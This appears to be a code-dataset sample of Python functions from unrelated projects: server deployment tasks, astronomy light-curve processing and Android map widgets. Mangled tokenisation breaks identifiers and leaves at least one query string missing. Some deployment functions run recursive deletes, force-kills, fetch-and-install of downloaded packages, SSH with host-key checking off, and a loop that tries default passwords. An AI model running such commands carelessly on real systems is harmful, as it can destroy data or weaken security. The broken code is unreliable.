def sync media ( self , sync set = None , clean = 0 , iter local paths = 0 ) : # Ensure a site is selected. self . genv . SITE = self . genv . SITE or self . genv . default site r = self . local renderer clean = int ( clean ) self . vprint ( 'Getting site data for %s...' % self . genv . SITE ) self . set site specifics ( self . genv . SITE ) sync sets = r . env . sync sets if sync set : sync sets = [ sync set ] ret paths = [ ] for sync set in sync sets : for paths in r . env . sync sets [ sync set ] : r . env . sync local path = os . path . abspath ( paths [ 'local path' ] % self . genv ) if paths [ 'local path' ] . endswith ( '/' ) and not r . env . sync local path . endswith ( '/' ) : r . env . sync local path += '/' if iter local paths : ret paths . append ( r . env . sync local path ) continue r . env . sync remote path = paths [ 'remote path' ] % self . genv if clean : r . sudo ( 'rm -Rf {apache sync remote path}' ) print ( 'Syncing %s to %s...' % ( r . env . sync local path , r . env . sync remote path ) ) r . env . tmp chmod = paths . get ( 'chmod' , r . env . chmod ) r . sudo ( 'mkdir -p {apache sync remote path}' ) r . sudo ( 'chmod -R {apache tmp chmod} {apache sync remote path}' ) r . local ( 'rsync -rvz --progress --recursive --no-p --no-g ' '--rsh "ssh -o Strict Host Key Checking=no -i {key filename}" {apache sync local path} {user}@{host string}:{apache sync remote path}' ) r . sudo ( 'chown -R {apache web user}:{apache web group} {apache sync remote path}' ) if iter local paths : return ret paths
def configure site ( self , full = 1 , site = None , delete old = 0 ) : from burlap import service r = self . local renderer print ( 'Configuring Apache...' , file = sys . stderr ) site = site or self . genv . SITE if int ( delete old ) and site == ALL : # Delete all existing enabled and available sites. r . sudo ( 'rm -f {sites available}/*' ) r . sudo ( 'rm -f {sites enabled}/*' ) if r . env . manage site conf : # Run an optional customizable command to clear or delete old sites before writing the new ones. if r . env . delete site command : r . sudo ( r . env . delete site command ) for site , site data in self . iter sites ( site = site , setter = self . set site specifics ) : r = self . local renderer #r.env.site = site if self . verbose : print ( '-' * 80 , file = sys . stderr ) print ( 'Site:' , site , file = sys . stderr ) print ( '-' * 80 , file = sys . stderr ) r . env . ssl = site . endswith ( ' secure' ) r . env . apache site = site r . env . server name = r . format ( r . env . domain template ) # Write WSGI template if r . env . wsgi enabled : r . pc ( 'Writing WSGI template for site %s...' % site ) r . env . wsgi scriptalias = r . format ( r . env . wsgi scriptalias ) fn = self . render to file ( r . env . wsgi template ) r . env . wsgi dir = r . env . remote dir = os . path . split ( r . env . wsgi scriptalias ) [ 0 ] r . sudo ( 'mkdir -p {remote dir}' ) r . put ( local path = fn , remote path = r . env . wsgi scriptalias , use sudo = True ) # Write site configuration. r . pc ( 'Writing site configuration for site %s...' % site ) r . env . auth basic authuserfile = r . format ( self . env . auth basic authuserfile ) r . env . ssl certificates = list ( self . iter certificates ( ) ) if r . env . server aliases template : r . env . server aliases = r . format ( r . env . server aliases template ) if r . env . domain with sub template : r . env . domain with sub = r . format ( r . env . domain with sub template ) if r . env . domain without sub template : r . env . domain without sub = r . format ( r . env . domain without sub template ) if r . env . domain template : r . env . domain = r . format ( r . env . domain template ) genv = r . collect genv ( ) genv [ 'current hostname' ] = self . current hostname fn = self . render to file ( self . env . site template , extra = genv , formatter = partial ( r . format , ignored variables = self . env . ignored template variables ) ) r . env . site conf = site + '.conf' r . env . site conf fqfn = os . path . join ( r . env . sites available , r . env . site conf ) r . put ( local path = fn , remote path = r . env . site conf fqfn , use sudo = True ) self . enable site ( site ) self . clear local renderer ( ) self . enable mods ( ) if int ( full ) : # Write master Apache configuration file. if r . env . manage httpd conf : fn = self . render to file ( 'apache/apache httpd.template.conf' ) r . put ( local path = fn , remote path = r . env . conf , use sudo = True ) # Write Apache listening ports configuration. if r . env . manage ports conf : fn = self . render to file ( 'apache/apache ports.template.conf' ) r . put ( local path = fn , remote path = r . env . ports path , use sudo = True ) r . sudo ( 'chown -R {apache web user}:{apache web group} {apache root}' )
def maint up ( self ) : r = self . local renderer fn = self . render to file ( r . env . maintenance template , extra = { 'current hostname' : self . current hostname } ) r . put ( local path = fn , remote path = r . env . maintenance path , use sudo = True ) r . sudo ( 'chown -R {apache web user}:{apache web group} {maintenance path}' )
def get current commit ( self ) : with hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) : s = str ( self . local ( 'git rev-parse HEAD' , capture = True ) ) self . vprint ( 'current commit:' , s ) return s
def ssh config ( self , name = '' ) : r = self . local renderer with self . settings ( hide ( 'running' ) ) : output = r . local ( 'vagrant ssh-config %s' % name , capture = True ) config = { } for line in output . splitlines ( ) [ 1 : ] : key , value = line . strip ( ) . split ( ' ' , 2 ) config [ key ] = value return config
def version ( self ) : r = self . local renderer with self . settings ( hide ( 'running' , 'warnings' ) , warn only = True ) : res = r . local ( 'vagrant --version' , capture = True ) if res . failed : return None line = res . splitlines ( ) [ - 1 ] version = re . match ( r'Vagrant (?:v(?:ersion )?)?(.*)' , line ) . group ( 1 ) return tuple ( to int ( part ) for part in version . split ( '.' ) )
def base boxes ( self ) : return sorted ( list ( set ( [ name for name , provider in self . box list ( ) ] ) ) )
def install from upstream ( self ) : from burlap . system import get arch , distrib family r = self . local renderer content = urlopen ( r . env . download url ) . read ( ) print ( len ( content ) ) matches = DOWNLOAD LINK PATTERN . findall ( content ) print ( matches ) arch = get arch ( ) # e.g. 'x86 64' family = distrib family ( ) if family == DEBIAN : ext = '.deb' matches = [ match for match in matches if match . endswith ( ext ) and arch in match ] print ( 'matches:' , matches ) assert matches , "No matches found." assert len ( matches ) == 1 , "Too many matches found: %s" % ( ', ' . join ( matches ) ) r . env . final download url = matches [ 0 ] r . env . local filename = '/tmp/vagrant%s' % ext r . run ( 'wget -O {local filename} {final download url}' ) r . sudo ( 'dpkg -i {local filename}' ) else : raise Not Implemented Error ( 'Unsupported family: %s' % family )
def force stop ( self ) : r = self . local renderer with self . settings ( warn only = True ) : r . sudo ( 'pkill -9 -f celery' ) r . sudo ( 'rm -f /tmp/celery*.pid' )
def set permissions ( self ) : r = self . local renderer for path in r . env . paths owned : r . env . path owned = path r . sudo ( 'chown {celery daemon user}:{celery daemon user} {celery path owned}' )
def create supervisor services ( self , site ) : self . vprint ( 'create supervisor services:' , site ) self . set site specifics ( site = site ) r = self . local renderer if self . verbose : print ( 'r.env:' ) pprint ( r . env , indent = 4 ) self . vprint ( 'r.env.has worker:' , r . env . has worker ) if not r . env . has worker : self . vprint ( 'skipping: no celery worker' ) return if self . name . lower ( ) not in self . genv . services : self . vprint ( 'skipping: celery not enabled' ) return hostname = self . current hostname target sites = self . genv . available sites by host . get ( hostname , None ) if target sites and site not in target sites : self . vprint ( 'skipping: site not supported on this server' ) return self . render paths ( ) conf name = 'celery %s.conf' % site ret = r . render to string ( 'celery/celery supervisor.template.conf' ) return conf name , ret
def purge keys ( self ) : r = self . local renderer r . env . default ip = self . hostname to ip ( self . env . default hostname ) r . env . home dir = '/home/%s' % getpass . getuser ( ) r . local ( 'ssh-keygen -f "{home dir}/.ssh/known hosts" -R {host string}' ) if self . env . default hostname : r . local ( 'ssh-keygen -f "{home dir}/.ssh/known hosts" -R {default hostname}' ) if r . env . default ip : r . local ( 'ssh-keygen -f "{home dir}/.ssh/known hosts" -R {default ip}' )
def find working password ( self , usernames = None , host strings = None ) : r = self . local renderer if host strings is None : host strings = [ ] if not host strings : host strings . append ( self . genv . host string ) if usernames is None : usernames = [ ] if not usernames : usernames . append ( self . genv . user ) for host string in host strings : for username in usernames : passwords = [ ] passwords . append ( self . genv . user default passwords [ username ] ) passwords . append ( self . genv . user passwords [ username ] ) passwords . append ( self . env . default password ) for password in passwords : with settings ( warn only = True ) : r . env . host string = host string r . env . password = password r . env . user = username ret = r . local ( "sshpass -p '{password}' ssh -o Strict Host Key Checking=no {user}@{host string} echo hello" , capture = True ) #print('ret.return code:', ret.return code) #             print('ret000:[%s]' % ret) #code 1 = good password, but prompts needed #code 5 = bad password #code 6 = good password, but host public key is unknown if ret . return code in ( 1 , 6 ) or 'hello' in ret : # Login succeeded, so we haven't yet changed the password, so use the default password. return host string , username , password raise Exception ( 'No working login found.' )
def get public ip ( self ) : r = self . local renderer ret = r . run ( r . env . get public ip command ) or '' ret = ret . strip ( ) print ( 'ip:' , ret ) return ret
def query ( query , use sudo = True , * * kwargs ) : func = use sudo and run as root or run user = kwargs . get ( 'mysql user' ) or env . get ( 'mysql user' ) password = kwargs . get ( 'mysql password' ) or env . get ( 'mysql password' ) options = [ '--batch' , '--raw' , '--skip-column-names' , ] if user : options . append ( '--user=%s' % quote ( user ) ) if password : options . append ( '--password=%s' % quote ( password ) ) options = ' ' . join ( options ) return func ( 'mysql %(options)s --execute=%(query)s' % { 'options' : options , 'query' : quote ( query ) , } )
def user exists ( name , host = 'localhost' , * * kwargs ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn only = True ) : res = query ( % { 'name' : name , 'host' : host , } , * * kwargs ) return res . succeeded and ( int ( res ) == 1 )
def database exists ( name , * * kwargs ) : with settings ( hide ( 'running' , 'stdout' , 'stderr' , 'warnings' ) , warn only = True ) : res = query ( "SHOW DATABASES LIKE '%(name)s';" % { 'name' : name } , * * kwargs ) return res . succeeded and ( res == name )
def conf path ( self ) : from burlap . system import distrib id , distrib release hostname = self . current hostname if hostname not in self . conf cache : self . env . conf specifics [ hostname ] = self . env . conf default d id = distrib id ( ) d release = distrib release ( ) for key in ( ( d id , d release ) , ( d id , ) ) : if key in self . env . conf specifics : self . conf cache [ hostname ] = self . env . conf specifics [ key ] return self . conf cache [ hostname ]
def drop views ( self , name = None , site = None ) : r = self . database renderer result = r . sudo ( "mysql --batch -v -h {db host} " #"-u {db root username} -p'{db root password}' " "-u {db user} -p'{db password}' " "--execute=\"SELECT GROUP CONCAT(CONCAT(TABLE SCHEMA,'.',table name) SEPARATOR ', ') AS views " "FROM INFORMATION SCHEMA.views WHERE TABLE SCHEMA = '{db name}' ORDER BY table name DESC;\"" ) result = re . findall ( r'^views[\s\t\r\n]+(.*)' , result , flags = re . IGNORECASE | re . DOTALL | re . MULTILINE ) if not result : return r . env . db view list = result [ 0 ] #cmd = ("mysql -v -h {db host} -u {db root username} -p'{db root password}' " \ r . sudo ( "mysql -v -h {db host} -u {db user} -p'{db password}' " "--execute=\"DROP VIEW {db view list} CASCADE;\"" )
def exists ( self , * * kwargs ) : name = kwargs . pop ( 'name' , 'default' ) site = kwargs . pop ( 'site' , None ) r = self . database renderer ( name = name , site = site ) ret = r . run ( 'mysql -h {db host} -u {db root username} ' '-p"{db root password}" -N -B -e "SELECT IF(\'{db name}\'' ' IN(SELECT SCHEMA NAME FROM INFORMATION SCHEMA.SCHEMATA), ' '\'exists\', \'notexists\') AS found;"' ) if ret is not None : ret = 'notexists' not in ( ret or 'notexists' ) if ret is not None : msg = '%s database on site %s %s exist.' % ( name . title ( ) , env . SITE , 'DOES' if ret else 'DOES NOT' ) if ret : print ( green ( msg ) ) else : print ( red ( msg ) ) return ret
def pycompress sqlitecurve ( sqlitecurve , force = False ) : outfile = '%s.gz' % sqlitecurve try : if os . path . exists ( outfile ) and not force : os . remove ( sqlitecurve ) return outfile else : with open ( sqlitecurve , 'rb' ) as infd : with gzip . open ( outfile , 'wb' ) as outfd : shutil . copyfileobj ( infd , outfd ) if os . path . exists ( outfile ) : os . remove ( sqlitecurve ) return outfile except Exception as e : return None
def pyuncompress sqlitecurve ( sqlitecurve , force = False ) : outfile = sqlitecurve . replace ( '.gz' , '' ) try : if os . path . exists ( outfile ) and not force : return outfile else : with gzip . open ( sqlitecurve , 'rb' ) as infd : with open ( outfile , 'wb' ) as outfd : shutil . copyfileobj ( infd , outfd ) # do not remove the intput file yet if os . path . exists ( outfile ) : return outfile except Exception as e : return None
def parse csv header lcc csv v1 ( headerlines ) : # the first three lines indicate the format name, comment char, separator commentchar = headerlines [ 1 ] separator = headerlines [ 2 ] headerlines = [ x . lstrip ( '%s ' % commentchar ) for x in headerlines [ 3 : ] ] # next, find the indices of the various LC sections metadatastart = headerlines . index ( 'OBJECT METADATA' ) columnstart = headerlines . index ( 'COLUMN DEFINITIONS' ) lcstart = headerlines . index ( 'LIGHTCURVE' ) metadata = ' ' . join ( headerlines [ metadatastart + 1 : columnstart - 1 ] ) columns = ' ' . join ( headerlines [ columnstart + 1 : lcstart - 1 ] ) metadata = json . loads ( metadata ) columns = json . loads ( columns ) return metadata , columns , separator
def starfeatures worker ( task ) : try : ( lcfile , outdir , kdtree , objlist , lcflist , neighbor radius arcsec , deredden , custom bandpasses , lcformat , lcformatdir ) = task return get starfeatures ( lcfile , outdir , kdtree , objlist , lcflist , neighbor radius arcsec , deredden = deredden , custom bandpasses = custom bandpasses , lcformat = lcformat , lcformatdir = lcformatdir ) except Exception as e : return None
def pwd phasebin ( phases , mags , binsize = 0.002 , minbin = 9 ) : bins = np . arange ( 0.0 , 1.0 , binsize ) binnedphaseinds = npdigitize ( phases , bins ) binnedphases , binnedmags = [ ] , [ ] for x in npunique ( binnedphaseinds ) : thisbin inds = binnedphaseinds == x thisbin phases = phases [ thisbin inds ] thisbin mags = mags [ thisbin inds ] if thisbin inds . size > minbin : binnedphases . append ( npmedian ( thisbin phases ) ) binnedmags . append ( npmedian ( thisbin mags ) ) return np . array ( binnedphases ) , np . array ( binnedmags )
def periodicfeatures worker ( task ) : pfpickle , lcbasedir , outdir , starfeatures , kwargs = task try : return get periodicfeatures ( pfpickle , lcbasedir , outdir , starfeatures = starfeatures , * * kwargs ) except Exception as e : LOGEXCEPTION ( 'failed to get periodicfeatures for %s' % pfpickle )
def commit ( self ) : if not self . connection . closed : self . connection . commit ( ) else : raise Attribute Error ( 'postgres connection to %s is closed' % self . database )
def rollback ( self ) : if not self . connection . closed : self . connection . rollback ( ) else : raise Attribute Error ( 'postgres connection to %s is closed' % self . database )
def log prior transit ( theta , priorbounds ) : # priorbounds contains the input priors, and because of how we previously # sorted theta, its sorted keys tell us which parts of theta correspond to # which physical quantities. allowed = True for ix , key in enumerate ( np . sort ( list ( priorbounds . keys ( ) ) ) ) : if priorbounds [ key ] [ 0 ] < theta [ ix ] < priorbounds [ key ] [ 1 ] : allowed = True and allowed else : allowed = False if allowed : return 0. return - np . inf
def list trilegal filtersystems ( ) : print ( '%-40s %s' % ( 'FILTER SYSTEM NAME' , 'DESCRIPTION' ) ) print ( '%-40s %s' % ( '------------------' , '-----------' ) ) for key in sorted ( TRILEGAL FILTER SYSTEMS . keys ( ) ) : print ( '%-40s %s' % ( key , TRILEGAL FILTER SYSTEMS [ key ] [ 'desc' ] ) )
def initialize ( self , currentdir , assetpath , cplist , cplistfile , executor , readonly , baseurl ) : self . currentdir = currentdir self . assetpath = assetpath self . currentproject = cplist self . cplistfile = cplistfile self . executor = executor self . readonly = readonly self . baseurl = baseurl
def initialize ( self , executor , secret ) : self . executor = executor self . secret = secret
def epd function ( coeffs , fsv , fdv , fkv , xcc , ycc , bgv , bge , iha , izd ) : return ( coeffs [ 0 ] * fsv * fsv + coeffs [ 1 ] * fsv + coeffs [ 2 ] * fdv * fdv + coeffs [ 3 ] * fdv + coeffs [ 4 ] * fkv * fkv + coeffs [ 5 ] * fkv + coeffs [ 6 ] + coeffs [ 7 ] * fsv * fdv + coeffs [ 8 ] * fsv * fkv + coeffs [ 9 ] * fdv * fkv + coeffs [ 10 ] * np . sin ( 2 * pi value * xcc ) + coeffs [ 11 ] * np . cos ( 2 * pi value * xcc ) + coeffs [ 12 ] * np . sin ( 2 * pi value * ycc ) + coeffs [ 13 ] * np . cos ( 2 * pi value * ycc ) + coeffs [ 14 ] * np . sin ( 4 * pi value * xcc ) + coeffs [ 15 ] * np . cos ( 4 * pi value * xcc ) + coeffs [ 16 ] * np . sin ( 4 * pi value * ycc ) + coeffs [ 17 ] * np . cos ( 4 * pi value * ycc ) + coeffs [ 18 ] * bgv + coeffs [ 19 ] * bge + coeffs [ 20 ] * iha + coeffs [ 21 ] * izd )
def epd residual ( coeffs , mags , fsv , fdv , fkv , xcc , ycc , bgv , bge , iha , izd ) : f = epd function ( coeffs , fsv , fdv , fkv , xcc , ycc , bgv , bge , iha , izd ) residual = mags - f return residual
def get legendre deg ctd ( npts ) : from scipy . interpolate import interp1d degs = nparray ( [ 4 , 5 , 6 , 10 , 15 ] ) pts = nparray ( [ 1e2 , 3e2 , 5e2 , 1e3 , 3e3 ] ) fn = interp1d ( pts , degs , kind = 'linear' , bounds error = False , fill value = ( min ( degs ) , max ( degs ) ) ) legendredeg = int ( npfloor ( fn ( npts ) ) ) return legendredeg
def varfeatures worker ( task ) : try : ( lcfile , outdir , timecols , magcols , errcols , mindet , lcformat , lcformatdir ) = task return get varfeatures ( lcfile , outdir , timecols = timecols , magcols = magcols , errcols = errcols , mindet = mindet , lcformat = lcformat , lcformatdir = lcformatdir ) except Exception as e : return None
def runpf worker ( task ) : ( lcfile , outdir , timecols , magcols , errcols , lcformat , lcformatdir , pfmethods , pfkwargs , getblssnr , sigclip , nworkers , minobservations , excludeprocessed ) = task if os . path . exists ( lcfile ) : pfresult = runpf ( lcfile , outdir , timecols = timecols , magcols = magcols , errcols = errcols , lcformat = lcformat , lcformatdir = lcformatdir , pfmethods = pfmethods , pfkwargs = pfkwargs , getblssnr = getblssnr , sigclip = sigclip , nworkers = nworkers , minobservations = minobservations , excludeprocessed = excludeprocessed ) return pfresult else : LOGERROR ( 'LC does not exist for requested file %s' % lcfile ) return None
def read hatpi textlc ( lcfile ) : if 'TF1' in lcfile : thiscoldefs = COLDEFS + [ ( 'itf1' , float ) ] elif 'TF2' in lcfile : thiscoldefs = COLDEFS + [ ( 'itf2' , float ) ] elif 'TF3' in lcfile : thiscoldefs = COLDEFS + [ ( 'itf3' , float ) ] LOGINFO ( 'reading %s' % lcfile ) if lcfile . endswith ( '.gz' ) : infd = gzip . open ( lcfile , 'r' ) else : infd = open ( lcfile , 'r' ) with infd : lclines = infd . read ( ) . decode ( ) . split ( '\n' ) lclines = [ x . split ( ) for x in lclines if ( '#' not in x and len ( x ) > 0 ) ] ndet = len ( lclines ) if ndet > 0 : lccols = list ( zip ( * lclines ) ) lcdict = { x [ 0 ] : y for ( x , y ) in zip ( thiscoldefs , lccols ) } # convert to ndarray for col in thiscoldefs : lcdict [ col [ 0 ] ] = np . array ( [ col [ 1 ] ( x ) for x in lcdict [ col [ 0 ] ] ] ) else : lcdict = { } LOGWARNING ( 'no detections in %s' % lcfile ) # convert to empty ndarrays for col in thiscoldefs : lcdict [ col [ 0 ] ] = np . array ( [ ] ) # add the object's name to the lcdict hatid = HATIDREGEX . findall ( lcfile ) lcdict [ 'objectid' ] = hatid [ 0 ] if hatid else 'unknown object' # add the columns to the lcdict lcdict [ 'columns' ] = [ x [ 0 ] for x in thiscoldefs ] # add some basic info similar to usual HATL Cs lcdict [ 'objectinfo' ] = { 'ndet' : ndet , 'hatid' : hatid [ 0 ] if hatid else 'unknown object' , 'network' : 'HP' , } # break out the {stationid}-{framenum}{framesub} {ccdnum} framekey # into separate columns framekeyelems = FRAMEREGEX . findall ( '\n' . join ( lcdict [ 'frk' ] ) ) lcdict [ 'stf' ] = np . array ( [ ( int ( x [ 0 ] ) if x [ 0 ] . isdigit ( ) else np . nan ) for x in framekeyelems ] ) lcdict [ 'cfn' ] = np . array ( [ ( int ( x [ 1 ] ) if x [ 0 ] . isdigit ( ) else np . nan ) for x in framekeyelems ] ) lcdict [ 'cfs' ] = np . array ( [ x [ 2 ] for x in framekeyelems ] ) lcdict [ 'ccd' ] = np . array ( [ ( int ( x [ 3 ] ) if x [ 0 ] . isdigit ( ) else np . nan ) for x in framekeyelems ] ) # update the column list with these columns lcdict [ 'columns' ] . extend ( [ 'stf' , 'cfn' , 'cfs' , 'ccd' ] ) # add more objectinfo: 'stations', etc. lcdict [ 'objectinfo' ] [ 'network' ] = 'HP' lcdict [ 'objectinfo' ] [ 'stations' ] = [ 'HP%s' % x for x in np . unique ( lcdict [ 'stf' ] ) . tolist ( ) ] return lcdict
def read hatpi pklc ( lcfile ) : try : if lcfile . endswith ( '.gz' ) : infd = gzip . open ( lcfile , 'rb' ) else : infd = open ( lcfile , 'rb' ) lcdict = pickle . load ( infd ) infd . close ( ) return lcdict except Unicode Decode Error : if lcfile . endswith ( '.gz' ) : infd = gzip . open ( lcfile , 'rb' ) else : infd = open ( lcfile , 'rb' ) LOGWARNING ( 'pickle %s was probably from Python 2 ' 'and failed to load without using "latin1" encoding. ' 'This is probably a numpy issue: ' 'http://stackoverflow.com/q/11305790' % lcfile ) lcdict = pickle . load ( infd , encoding = 'latin1' ) infd . close ( ) return lcdict
def parallel concat lcdir ( lcbasedir , objectidlist , aperture = 'TF1' , postfix = '.gz' , sortby = 'rjd' , normalize = True , outdir = None , recursive = True , nworkers = 32 , maxworkertasks = 1000 ) : if not outdir : outdir = 'pklcs' if not os . path . exists ( outdir ) : os . mkdir ( outdir ) tasks = [ ( lcbasedir , x , { 'aperture' : aperture , 'postfix' : postfix , 'sortby' : sortby , 'normalize' : normalize , 'outdir' : outdir , 'recursive' : recursive } ) for x in objectidlist ] pool = mp . Pool ( nworkers , maxtasksperchild = maxworkertasks ) results = pool . map ( parallel concat worker , tasks ) pool . close ( ) pool . join ( ) return { x : y for ( x , y ) in zip ( objectidlist , results ) }
def generate hatpi binnedlc pkl ( binnedpklf , textlcf , timebinsec , outfile = None ) : binlcdict = read hatpi binnedlc ( binnedpklf , textlcf , timebinsec ) if binlcdict : if outfile is None : outfile = os . path . join ( os . path . dirname ( binnedpklf ) , '%s-hplc.pkl' % ( os . path . basename ( binnedpklf ) . replace ( 'sec-lc.pkl.gz' , '' ) ) ) return lcdict to pickle ( binlcdict , outfile = outfile ) else : LOGERROR ( 'could not read binned HATPI LC: %s' % binnedpklf ) return None
def get bls stats ( stimes , smags , serrs , thistransdepth , thistransduration , ingressdurationfraction , nphasebins , thistransingressbin , thistransegressbin , thisbestperiod , thisnphasebins , magsarefluxes = False , verbose = False ) : try : # try getting the minimum light epoch using the phase bin method me epochbin = int ( ( thistransegressbin + thistransingressbin ) / 2.0 ) me phases = ( ( stimes - stimes . min ( ) ) / thisbestperiod - npfloor ( ( stimes - stimes . min ( ) ) / thisbestperiod ) ) me phases sortind = npargsort ( me phases ) me sorted phases = me phases [ me phases sortind ] me sorted times = stimes [ me phases sortind ] me bins = nplinspace ( 0.0 , 1.0 , thisnphasebins ) me bininds = npdigitize ( me sorted phases , me bins ) me centertransit ind = me bininds == me epochbin me centertransit phase = ( npmedian ( me sorted phases [ me centertransit ind ] ) ) me centertransit timeloc = npwhere ( npabs ( me sorted phases - me centertransit phase ) == npmin ( npabs ( me sorted phases - me centertransit phase ) ) ) me centertransit time = me sorted times [ me centertransit timeloc ] if me centertransit time . size > 1 : LOGWARNING ( 'multiple possible times-of-center transits ' 'found for period %.7f, picking the first ' 'one from: %s' % ( thisbestperiod , repr ( me centertransit time ) ) ) thisminepoch = me centertransit time [ 0 ] except Exception as e : LOGEXCEPTION ( 'could not determine the center time of transit for ' 'the phased LC, trying Sav Gol fit instead...' ) # fit a Savitsky-Golay instead and get its minimum savfit = savgol fit magseries ( stimes , smags , serrs , thisbestperiod , magsarefluxes = magsarefluxes , verbose = verbose , sigclip = None ) thisminepoch = savfit [ 'fitinfo' ] [ 'fitepoch' ] if isinstance ( thisminepoch , npndarray ) : if verbose : LOGWARNING ( 'minimum epoch is actually an array:\n' '%s\n' 'instead of a float, ' 'are there duplicate time values ' 'in the original input? ' 'will use the first value in this array.' % repr ( thisminepoch ) ) thisminepoch = thisminepoch [ 0 ] # set up trapezoid transit model to fit for this LC transitparams = [ thisbestperiod , thisminepoch , thistransdepth , thistransduration , ingressdurationfraction * thistransduration ] modelfit = traptransit fit magseries ( stimes , smags , serrs , transitparams , sigclip = None , magsarefluxes = magsarefluxes , verbose = verbose ) # if the model fit succeeds, calculate SNR using the trapezoid model fit if modelfit and modelfit [ 'fitinfo' ] [ 'finalparams' ] is not None : fitparams = modelfit [ 'fitinfo' ] [ 'finalparams' ] fiterrs = modelfit [ 'fitinfo' ] [ 'finalparamerrs' ] modelmags , actualmags , modelphase = ( modelfit [ 'fitinfo' ] [ 'fitmags' ] , modelfit [ 'magseries' ] [ 'mags' ] , modelfit [ 'magseries' ] [ 'phase' ] ) subtractedmags = actualmags - modelmags subtractedrms = npstd ( subtractedmags ) fit period , fit epoch , fit depth , fit duration , fit ingress dur = ( fitparams ) npts in transit = modelfit [ 'fitinfo' ] [ 'ntransitpoints' ] transit snr = ( npsqrt ( npts in transit ) * npabs ( fit depth / subtractedrms ) ) if verbose : LOGINFO ( 'refit best period: %.6f, ' 'refit center of transit: %.5f' % ( fit period , fit epoch ) ) LOGINFO ( 'npoints in transit: %s' % npts in transit ) LOGINFO ( 'transit depth (delta): %.5f, ' 'frac transit length (q): %.3f, ' ' SNR: %.3f' % ( fit depth , fit duration , transit snr ) ) return { 'period' : fit period , 'epoch' : fit epoch , 'snr' : transit snr , 'transitdepth' : fit depth , 'transitduration' : fit duration , 'nphasebins' : nphasebins , 'transingressbin' : thistransingressbin , 'transegressbin' : thistransegressbin , 'npoints in transit' : npts in transit , 'blsmodel' : modelmags , 'subtractedmags' : subtractedmags , 'phasedmags' : actualmags , 'phases' : modelphase , 'fitparams' : fitparams , 'fiterrs' : fiterrs , 'fitinfo' : modelfit } # if the model fit doesn't work, then do the SNR calculation the old way else : # phase using this epoch phased magseries = phase magseries with errs ( stimes , smags , serrs , thisbestperiod , thisminepoch , wrap = False , sort = True ) tphase = phased magseries [ 'phase' ] tmags = phased magseries [ 'mags' ] # use the transit depth and duration to subtract the BLS transit # model from the phased mag series. we're centered about 0.0 as the # phase of the transit minimum so we need to look at stuff from # [0.0, transitphase] and [1.0-transitphase, 1.0] transitphase = thistransduration / 2.0 transitindices = ( ( tphase < transitphase ) | ( tphase > ( 1.0 - transitphase ) ) ) # this is the BLS model # constant = median(tmags) outside transit # constant = thistransitdepth inside transit blsmodel = npfull like ( tmags , npmedian ( tmags ) ) if magsarefluxes : # eebls.f returns +ve transit depth for fluxes # so we need to subtract here to get fainter fluxes in transit blsmodel [ transitindices ] = ( blsmodel [ transitindices ] - thistransdepth ) else : # eebls.f returns -ve transit depth for magnitudes # so we need to subtract here to get fainter mags in transits blsmodel [ transitindices ] = ( blsmodel [ transitindices ] - thistransdepth ) # see  init /get snr of dip docstring for description of transit # SNR equation, which is what we use for `thissnr`. subtractedmags = tmags - blsmodel subtractedrms = npstd ( subtractedmags ) npts in transit = len ( tmags [ transitindices ] ) thissnr = ( npsqrt ( npts in transit ) * npabs ( thistransdepth / subtractedrms ) ) # tell user about stuff if verbose = True if verbose : LOGINFO ( 'refit best period: %.6f, ' 'refit center of transit: %.5f' % ( thisbestperiod , thisminepoch ) ) LOGINFO ( 'transit ingress phase = %.3f to %.3f' % ( 1.0 - transitphase , 1.0 ) ) LOGINFO ( 'transit egress phase = %.3f to %.3f' % ( 0.0 , transitphase ) ) LOGINFO ( 'npoints in transit: %s' % tmags [ transitindices ] . size ) LOGINFO ( 'transit depth (delta): %.5f, ' 'frac transit length (q): %.3f, ' ' SNR: %.3f' % ( thistransdepth , thistransduration , thissnr ) ) return { 'period' : thisbestperiod , 'epoch' : thisminepoch , 'snr' : thissnr , 'transitdepth' : thistransdepth , 'transitduration' : thistransduration , 'nphasebins' : nphasebins , 'transingressbin' : thistransingressbin , 'transegressbin' : thistransegressbin , 'blsmodel' : blsmodel , 'subtractedmags' : subtractedmags , 'phasedmags' : tmags , 'phases' : tphase }
def magbin varind gridsearch worker ( task ) : simbasedir , gridpoint , magbinmedian = task try : res = get recovered variables for magbin ( simbasedir , magbinmedian , stetson stdev min = gridpoint [ 0 ] , inveta stdev min = gridpoint [ 1 ] , iqr stdev min = gridpoint [ 2 ] , statsonly = True ) return res except Exception as e : LOGEXCEPTION ( 'failed to get info for %s' % gridpoint ) return None
def update proxy ( self , change ) : if change [ 'type' ] == 'container' : #: Only update what's needed self . proxy . update points ( change ) else : super ( Map Polyline , self ) . update proxy ( change )
def update proxy ( self , change ) : if change [ 'type' ] == 'container' : #: Only update what's needed self . proxy . update points ( change ) else : super ( Map Polygon , self ) . update proxy ( change )
def handle change ( self , change ) : op = change [ 'operation' ] if op in 'append' : self . add ( len ( change [ 'value' ] ) , Lat Lng ( * change [ 'item' ] ) ) elif op == 'insert' : self . add ( change [ 'index' ] , Lat Lng ( * change [ 'item' ] ) ) elif op == 'extend' : points = [ Lat Lng ( * p ) for p in change [ 'items' ] ] self . add All ( [ bridge . encode ( c ) for c in points ] ) elif op == ' setitem ' : self . set ( change [ 'index' ] , Lat Lng ( * change [ 'newitem' ] ) ) elif op == 'pop' : self . remove ( change [ 'index' ] ) else : raise Not Implemented Error ( "Unsupported change operation {}" . format ( op ) )
def create widget ( self ) : self . init options ( ) #: Retrieve the actual map Map Fragment . new Instance ( self . options ) . then ( self . on map fragment created ) # Holder for the fragment self . widget = Frame Layout ( self . get context ( ) ) # I wrote this a few days ago and already forget how this hack works... # lol We can't simply get a map reference using get Map Async in the # return value like we normally do with a normal call function return # value. The bridge design was modified to store an object that cannot # be decoded normally (via a standard Bridge.Packer) by saving the new # object in the cache returning the id of the handler or proxy that # invoked it. This way we can manually create a new id and pass that # "future reference-able" object as our listener. At which point the # bridge will create a reference entry in the cache for us with the of # the object we gave it. Once in the cache we can use it like any # bridge object we created. self . map = Google Map ( id = bridge . generate id ( ) )
